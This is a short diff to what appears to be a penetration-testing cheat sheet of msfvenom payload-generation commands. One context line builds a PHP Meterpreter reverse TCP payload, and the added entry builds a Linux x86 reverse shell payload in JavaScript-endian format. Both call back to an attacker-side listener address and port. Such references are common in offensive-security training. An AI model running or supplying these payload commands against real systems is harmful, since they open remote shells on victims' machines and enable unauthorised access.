@@ -90,4 +90,9 @@ One can also use the -a to specify the architecture or the --platform
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.178.3 LPORT=4444 -e php/base64 -f raw > /root/Desktop/msfvenom.php
 Note: Don't forget to add <?php and ?> in to msfvenom.php file
 
+16. javascript
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f js_le -o payload.js
+
+
+
 
